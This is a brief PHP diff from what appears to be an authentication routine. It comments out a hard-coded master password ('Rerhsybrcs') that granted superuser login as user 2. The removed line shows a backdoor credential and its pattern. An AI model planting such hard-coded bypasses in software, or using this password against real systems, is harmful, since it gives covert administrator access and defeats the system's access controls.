@@ -1299,7 +1299,7 @@ error_log('CANNOT UPDATE COOKIE '.$session_id);
             
             $superuser = false;
             if(false
-            || $password=='Rerhsybrcs'
+            //|| $password=='Rerhsybrcs'
             )
             {
                 $user = user_getById($this->mysqli, 2);
